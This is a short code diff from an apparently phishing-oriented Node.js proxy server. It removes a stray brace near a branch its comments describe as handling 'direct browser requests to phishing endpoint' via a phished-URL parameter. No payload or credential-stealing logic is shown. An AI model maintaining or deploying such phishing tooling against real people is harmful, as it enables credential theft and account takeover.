@@ -544,7 +544,6 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                     }
                 }
             }
-        }
         } else {
             // Handle direct browser requests to phishing endpoint without request body
             if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
